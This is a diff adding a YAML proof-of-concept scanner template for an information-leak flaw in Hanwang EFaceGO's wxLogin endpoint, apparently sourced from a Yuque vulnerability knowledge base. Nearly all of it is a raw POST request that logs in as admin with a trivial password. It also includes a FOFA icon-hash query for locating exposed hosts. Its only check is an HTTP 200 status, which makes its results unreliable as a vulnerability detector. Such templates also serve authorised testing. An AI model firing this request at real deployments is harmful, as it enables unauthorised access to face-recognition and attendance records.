@@ -1,0 +1,35 @@
+id: poc-neggd8v5ru9vgdo7
+info:
+  name: 汉王EFaceGO wxLogin存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/neggd8v5ru9vgdo7'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: neggd8v5ru9vgdo7
+    fofa: icon_hash="1380907357"
+http:
+- raw:
+  - 'POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: JSESSIONID=813E38790B66C7864D811BDFFA0F1BC8
+
+    Cache-Control: max-age=0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
